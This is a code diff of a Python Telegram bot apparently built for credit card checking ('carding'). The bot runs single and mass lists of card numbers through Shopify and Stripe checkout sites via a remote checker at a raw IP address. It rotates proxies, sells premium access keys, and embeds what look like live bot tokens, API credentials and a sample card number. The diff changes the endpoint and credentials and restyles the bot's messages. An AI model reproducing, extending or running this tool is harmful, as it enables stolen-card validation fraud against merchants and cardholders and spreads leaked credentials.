@@ -11,9 +11,9 @@ from urllib.parse import urlparse
 # Config
 API_ID = 26038836
 API_HASH = "25f462e2a8517df5014a653c39cc58ca"
-BOT_TOKEN = "8519130041:AAFYyMnkHISDLmilr1r4BLe0AN7R2RnmjoA" # Replace with your Bot Token
-ADMIN_ID = [7708627627, 7935621079, ] # Replace with your Admin ID(s)
-GROUP_ID = -1003732986709 # Replace with your Group ID
+BOT_TOKEN = "8627382926:AAFxeMzotAVHoN9OJ0TqT465K5bMALpy81o" # Replace with your Bot Token
+ADMIN_ID = [7935621079, 7708627627, 1308204344, 7856977111, 7029979857, 5295992382, 1965200355, 846788799, 7249000093, 7000007135, 8300009527, 7582867285] # Replace with your Admin ID(s)
+GROUP_ID = -1003769154282 # Replace with your Group ID
 
 # Files
 PREMIUM_FILE = "premium.json"
@@ -228,7 +228,7 @@ async def check_card_random_site(card, sites, user_id=None):
                 proxy_str = f"{ip}:{port}"
         
         # Build API URL with new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={card}&url={selected_site}'
+        url = f'http://108.165.12.183:8081/?cc={card}&url={selected_site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         
@@ -240,10 +240,19 @@ async def check_card_random_site(card, sites, user_id=None):
                 
                 try:
                     response_json = await res.json()
-                except:
-                    # If JSON parsing fails, try to get text
-                    response_text = await res.text()
-                    return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}, site_index
+                    if not isinstance(response_json, dict):
+                        if response_json is None:
+                            return {"Response": "API returned empty", "Price": "-", "Gateway": "-"}, site_index
+                        else:
+                            return {"Response": f"Invalid response type: {type(response_json).__name__}", "Price": "-", "Gateway": "-"}, site_index
+                except Exception as json_err:
+                    try:
+                        response_text = await res.text()
+                        if not response_text:
+                            return {"Response": "Empty API response", "Price": "-", "Gateway": "-"}, site_index
+                        return {"Response": f"API Error: {response_text[:100]}", "Price": "-", "Gateway": "-"}, site_index
+                    except:
+                        return {"Response": f"Parse Error: {str(json_err)[:100]}", "Price": "-", "Gateway": "-"}, site_index
                 
                 # Parse the new API response format
                 api_response = response_json.get('Response', '')
@@ -257,7 +266,7 @@ async def check_card_random_site(card, sites, user_id=None):
                 if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                     await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                     return {
-                        "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
+                        "Response": "⚠️ Proxy dead! Removed from list. Add new: /addpxy",
                         "Price": "-",
                         "Gateway": "-",
                         "Status": "Proxy Dead"
@@ -306,7 +315,7 @@ async def check_card_specific_site(card, site, user_id=None):
                 proxy_str = f"{ip}:{port}"
         
         # Build API URL with new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={card}&url={site}'
+        url = f'http://108.165.12.183:8081/?cc={card}&url={site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         
@@ -335,7 +344,7 @@ async def check_card_specific_site(card, site, user_id=None):
                 if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                     await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                     return {
-                        "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
+                        "Response": "⚠️ Proxy dead! Removed from list. Add new: /addpxy",
                         "Price": "-",
                         "Gateway": "-",
                         "Status": "Proxy Dead"
@@ -565,7 +574,7 @@ async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_
                 proxy_str = f"{ip}:{port}"
         
         # Use the new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={test_card}&url={site}'
+        url = f'http://108.165.12.183:8081/?cc={test_card}&url={site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         
@@ -590,7 +599,7 @@ async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_
                 # Check for proxy errors and remove dead proxy
                 if proxy_data and user_id and ('proxy' in response_msg.lower() or 'connection' in response_msg.lower() or 'timeout' in response_msg.lower()):
                     await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
-                    return {"status": "proxy_dead", "response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy", "site": site, "price": "-"}
+                    return {"status": "proxy_dead", "response": "⚠️ Proxy dead! Removed. Add new: /addpxy", "site": site, "price": "-"}
                 
                 if is_site_dead(response_msg): 
                     return {"status": "dead", "response": response_msg, "site": site, "price": price}
@@ -602,12 +611,12 @@ async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_
 client = TelegramClient('cc_bot', API_ID, API_HASH)
 
 def banned_user_message():
-    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd"
+    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙"
 
 def access_denied_message_with_button():
     """Returns access denied message and join group button"""
     message = "🚫 **Access Denied!** This command requires premium access or group usage."
-    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+5COVY2nuFms3M2Nk")]]
+    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+pNplrRLrEGY5NTU0")]]
     return message, buttons
 
 # --- Bot Command Handlers ---
@@ -617,39 +626,52 @@ async def start(event):
     _, access_type = await can_use(event.sender_id, event.chat)
     if access_type == "banned": return await event.reply(banned_user_message())
 
-    text = """🚀 **Hello and welcome!**
+    # Arrow Style UI (Design 7) - Premium Look
+    text = """╔══════════════════════════════════════════╗
+║                                          ║
+║     🎯 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 🎯          ║
+║        ➤ Elite Verification Tool       ║
+║                                          ║
+╠══════════════════════════════════════════╣
 
-Here are the available command categories.
+▶ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗚𝗔𝗧𝗘𝗪𝗔𝗬𝗦
+   │
+   ├─➤ /sh   → Single CC Verification
+   ├─➤ /msh  → Multiple CC Check
+   ├─➤ /mtxt → Upload & Verify TXT
+   └─➤ /ran  → Random Site Engine
 
-** Shopify Self **
-`/sh` ⇾ Check a single CC.
-`/msh` ⇾ Check multiple CCs from text.
-`/mtxt` ⇾ Check CCs from a `.txt` file.
-`/ran` ⇾ Check CCs from `.txt` using random sites.
+▶ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬𝗦
+   │
+   ├─➤ /st   → Stripe Auth Check
+   ├─➤ /mst  → Mass Stripe Auth
+   ├─➤ /mstxt→ Stripe TXT Mode
+   └─➤ /sadd → Add Stripe Site
 
-** Stripe Auth **
-`/st` ⇾ Check a single CC.
-`/mst` ⇾ Check multiple CCs from text.
-`/mstxt` ⇾ Check CCs from a `.txt` file.
-`/sadd` <site> ⇾ Add Stripe Auth site for ST commands.
+▶ 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 𝗧𝗢𝗢𝗟𝗦
+   │
+   ├─➤ /add   → Inject New Sites
+   ├─➤ /rm    → Eject Dead Sites
+   ├─➤ /check → Validate All Sites
+   ├─➤ /info  → View Profile Stats
+   └─➤ /redeem→ Activate Premium Key
 
-** Bot & User Management **
-`/add` <site> ⇾ Add site(s) to your DB.
-`/rm` <site> ⇾ Remove site(s) from your DB.
-`/check` ⇾ Test your saved sites.
-`/info` ⇾ Get your user information.
-`/redeem` <key> ⇾ Redeem a premium key.
+▶ 𝗣𝗥𝗢𝗫𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗥
+   │
+   ├─➤ /addpxy → Add Residential Proxy
+   ├─➤ /proxy  → View Proxy Pool
+   └─➤ /rmpxy  → Remove Dead Proxy
 
-** Proxy Management (Private Only) **
-`/addpxy` <proxy> ⇾ Add proxy (max 10, ip:port:user:pass).
-`/proxy` ⇾ View all your saved proxies.
-`/rmpxy` <index|all> ⇾ Remove proxy by index or all.
-"""
+╚══════════════════════════════════════════╝"""
 
     if access_type in ["premium_private", "premium_group"]:
-        text += f"\n💎 **Status:** Premium Access (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
+        text += f"
+
+💎 **Status:** Premium Access (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
     else:
-        text += f"\n🆓 **Status:** Group User (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
+        text += f"
+
+🆓 **Status:** Group User (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
 
     await event.reply(text)
 
@@ -685,7 +707,28 @@ async def generate_keys(event):
             generated_keys.append(key)
         await save_json(KEYS_FILE, keys_data)
         keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])
-        await event.reply(f"✅ 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 {amount} 𝙠𝙚𝙮(𝙨) f𝙤𝙧 {days} 𝙙𝙖𝙮(𝙨):\n\n{keys_text}")
+        keys_formatted = "\n".join([f"`🔑 {key}`" for key in generated_keys])
+        await event.reply(f"""╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+┃   🔐 **𝗞𝗘𝗬𝗦 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗** 🔐   ┃
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+📊 **𝗦𝗨𝗠𝗠𝗔𝗥𝗬:**
+• 𝗧𝗼𝘁𝗮𝗹 𝗞𝗲𝘆𝘀: {amount}
+• 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {days} 𝗗𝗮𝘆𝘀 𝗘𝗮𝗰𝗵
+• 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗥𝗘𝗗𝗘𝗘𝗠
+
+╔════════════════════════════════╗
+{keys_formatted}
+╚════════════════════════════════╝
+
+⚡ **𝗛𝗢𝗪 𝗧𝗢 𝗥𝗘𝗗𝗘𝗘𝗠:**
+𝗧𝘆𝗽𝗲: `/redeem <key>`
+
+💎 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/redeem ABC123XYZ789`
+
+╭─────────────────────────────╮
+│  ✨ 𝗞𝗘𝗬𝗦 𝗔𝗥𝗘 𝗢𝗡𝗘-𝗧𝗜𝗠𝗘 𝗨𝗦𝗘! ✨  │
+╰─────────────────────────────╯""")
     except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙧 𝙙𝙖𝙮s!")
     except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
 
@@ -706,7 +749,26 @@ async def redeem_key(event):
         keys_data[key]['used_by'] = event.sender_id
         keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
         await save_json(KEYS_FILE, keys_data)
-        await event.reply(f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
+        await event.reply(f"""╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+┃   🎉 **𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗** 🎉   ┃
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+╔════════════════════════════════╗
+║  ✅ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗         ║
+║  📅 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡: {days} 𝗗𝗔𝗬𝗦      ║
+║  👤 𝗣𝗟𝗔𝗡: 𝗣𝗥𝗘𝗠𝗜𝗨𝗠             ║
+║  🔥 𝗟𝗜𝗠𝗜𝗧: 𝟱𝟬𝟬 𝗖𝗖'𝗦           ║
+╚════════════════════════════════╝
+
+⚡ **𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗧𝗛𝗘 𝗘𝗟𝗜𝗧𝗘 𝗖𝗟𝗨𝗕!**
+
+🔓 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗔𝗰𝗰𝗲𝘀𝘀 𝗚𝗿𝗮𝗻𝘁𝗲𝗱
+💎 𝗙𝘂𝗹𝗹 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀 𝗨𝗻𝗹𝗼𝗰𝗸𝗲𝗱
+⚡ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗦𝗽𝗲𝗲𝗱 𝗘𝗻𝗮𝗯𝗹𝗲𝗱
+
+╭─────────────────────────────╮
+│  ✨ 𝗘𝗡𝗝𝗢𝗬 𝗬𝗢𝗨𝗥 𝗣𝗥𝗘𝗠𝗜𝗨𝗠! ✨  │
+╰─────────────────────────────╯""")
     except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
 
 @client.on(events.NewMessage(pattern='/add'))
@@ -715,7 +777,40 @@ async def add_site(event):
     if access_type == "banned": return await event.reply(banned_user_message())
     try:
         add_text = event.raw_text[4:].strip()
-        if not add_text: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩: /add site.com site.com")
+
+        # Check if user replied to a document
+        if event.reply_to_msg_id and not add_text:
+            replied_msg = await event.get_reply_message()
+            if replied_msg and replied_msg.document:
+                # Download and process txt file
+                file_path = await replied_msg.download_media()
+                try:
+                    async with aiofiles.open(file_path, "r") as f:
+                        file_content = await f.read()
+                    os.remove(file_path)
+                    add_text = file_content
+                    await event.reply("📄 **𝗧𝗫𝗧 𝗙𝗶𝗹𝗲 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱!**\n⚡ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝗶𝘁𝗲𝘀...")
+                except Exception as e:
+                    try: os.remove(file_path)
+                    except: pass
+                    return await event.reply(f"❌ 𝗘𝗿𝗿𝗼𝗿 𝗿𝗲𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲: {e}")
+
+        if not add_text: 
+            return await event.reply("""╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+┃   ❌ **𝗡𝗢 𝗦𝗜𝗧𝗘𝗦 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗** ❌   ┃
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+**𝗨𝗦𝗔𝗚𝗘:**
+
+📝 **𝗧𝗲𝘅𝘁 𝗠𝗼𝗱𝗲:**
+`/add site1.com site2.com`
+
+📄 **𝗧𝗫𝗧 𝗙𝗶𝗹𝗲 𝗠𝗼𝗱𝗲:**
+𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 `/add`
+
+╭─────────────────────────────╮
+│  ✨ 𝗦𝗶𝘁𝗲𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗮𝘂𝘁𝗼 𝘃𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ✨  │
+╰─────────────────────────────╯""")
         sites_to_add = extract_urls_from_text(add_text)
         if not sites_to_add: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
         sites = await load_json(SITE_FILE)
@@ -730,10 +825,32 @@ async def add_site(event):
         sites[str(event.sender_id)] = user_sites
         await save_json(SITE_FILE, sites)
         response_parts = []
-        if added_sites: response_parts.append("\n".join(f"✅ 𝙎𝙞𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝘼𝙙𝙙𝙚𝙙: {s}" for s in added_sites))
-        if already_exists: response_parts.append("\n".join(f"⚠️ 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨: {s}" for s in already_exists))
-        if response_parts: await event.reply("\n\n".join(response_parts))
-        else: await event.reply("❌ 𝙉𝙤 𝙣𝙚𝙬 𝙨𝙞𝙩𝙚𝙨 𝙩𝙤 𝙖𝙙𝙙!")
+        if added_sites: 
+            added_text = "\n".join([f"✅ `{s}`" for s in added_sites])
+            response_parts.append(f"╔════════════════════════════════╗\n{added_text}\n╚════════════════════════════════╝")
+        if already_exists: 
+            exists_text = "\n".join([f"⚠️ `{s}`" for s in already_exists])
+            response_parts.append(f"╔═══════ 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗘𝗫𝗜𝗦𝗧𝗦 ═══════╗\n{exists_text}\n╚════════════════════════════════╝")
+
+        if response_parts: 
+            final_msg = f"""╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+┃   📥 **𝗦𝗜𝗧𝗘𝗦 𝗔𝗗𝗗𝗘𝗗** 📥   ┃
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+{"\n\n".join(response_parts)}
+
+📊 **𝗧𝗢𝗧𝗔𝗟 𝗜𝗡 𝗗𝗕:** {len(user_sites)} 𝘀𝗶𝘁𝗲𝘀
+
+╭─────────────────────────────╮
+│  ✨ 𝗥𝗲𝗮𝗱𝘆 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸! ✨  │
+╰─────────────────────────────╯"""
+            await event.reply(final_msg)
+        else: 
+            await event.reply("""╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+┃   ❌ **𝗡𝗢 𝗡𝗘𝗪 𝗦𝗜𝗧𝗘𝗦** ❌   ┃
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+ℹ️ 𝗔𝗹𝗹 𝘀𝗶𝘁𝗲𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁 𝗶𝗻 𝘆𝗼𝘂𝗿 𝗗𝗕!""")
     except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
 
 @client.on(events.NewMessage(pattern='/rm'))
@@ -908,7 +1025,7 @@ async def sh(event):
     if access_type == "banned": return await event.reply(banned_user_message())
     if not can_access:
         buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
-        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd", buttons=buttons)
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙", buttons=buttons)
     asyncio.create_task(process_sh_card(event, access_type))
 
 async def process_sh_card(event, access_type):
@@ -935,10 +1052,10 @@ async def process_sh_card(event, access_type):
     sites = await load_json(SITE_FILE)
     user_sites = sites.get(str(event.sender_id), [])
     if not user_sites: return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇𝙨. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /𝙖𝙙𝙙")
-    loading_msg = await event.reply("🍳")
+    loading_msg = await event.reply("⚡")
     start_time = time.time()
     async def animate_loading():
-        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
+        emojis = ["⚡", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
         i = 0
         while True:
             try:
@@ -1005,7 +1122,7 @@ async def msh(event):
     if access_type == "banned": return await event.reply(banned_user_message())
     if not can_access:
         buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
-        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd", buttons=buttons)
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙", buttons=buttons)
     
     # Check if user has added proxy
     proxy_data = await get_user_proxy(event.sender_id)
@@ -1036,7 +1153,7 @@ async def process_msh_cards(event, cards, sites):
     except:
         username = f"user_{event.sender_id}"
     
-    sent_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
+    sent_msg = await event.reply(f"```🔥 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 ⚡ {len(cards)} 𝘾𝙖𝙧𝙙𝙨```")
     cards_per_site = 2
     current_site_index = 0
     cards_on_current_site = 0
@@ -1057,7 +1174,10 @@ async def process_msh_cards(event, cards, sites):
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
         for j, (card, result) in enumerate(zip(batch, results)):
-            if isinstance(result, Exception):
+            # Handle None result
+            if result is None:
+                result = {"Response": "API Error: No response from gateway", "Price": "-", "Gateway": "-"}
+            elif isinstance(result, Exception):
                 result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
 
             start_time = time.time()
@@ -1115,7 +1235,7 @@ async def mtxt(event):
     if access_type == "banned": return await event.reply(banned_user_message())
     if not can_access:
         buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
-        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd", buttons=buttons)
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙", buttons=buttons)
     
     # Check if user has added proxy
     proxy_data = await get_user_proxy(event.sender_id)
@@ -1167,7 +1287,7 @@ async def process_mtxt_cards(event, cards, local_sites):
     user_id = event.sender_id
     total = len(cards)
     checked, approved, charged, declined = 0, 0, 0, 0
-    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
+    status_msg = await event.reply(f"```🔥 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙄𝙣𝙩𝙚𝙣𝙨𝙞𝙫𝙚𝙡𝙮 ⚡```")
     cards_per_site = 4
     current_site_index = 0
     cards_on_current_site = 0
@@ -1214,7 +1334,10 @@ async def process_mtxt_cards(event, cards, local_sites):
             for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                 if user_id not in ACTIVE_MTXT_PROCESSES: break
 
-                if isinstance(result, Exception):
+                # Handle None result (API failed completely)
+                if result is None:
+                    result = {"Response": "API Error: No response from gateway", "Price": "-", "Gateway": "-"}
+                elif isinstance(result, Exception):
                     result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
 
                 checked += 1
@@ -1322,7 +1445,7 @@ Please add fresh sites using `/add` and try again.
                     [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                     [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]
                 ]
-                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
+                try: await status_msg.edit("```⚡ 𝙑𝙚𝙧𝙞𝙛𝙮𝙞𝙣𝙜 𝘾𝙖𝙧𝙙𝙨 𝙎𝙚𝙦𝙪𝙚𝙣𝙩𝙞𝙖𝙡𝙡𝙮...```", buttons=buttons)
                 except: pass
                 await asyncio.sleep(0.1)
 
@@ -1526,7 +1649,7 @@ async def ranfor(event):
     if access_type == "banned": return await event.reply(banned_user_message())
     if not can_access:
         buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
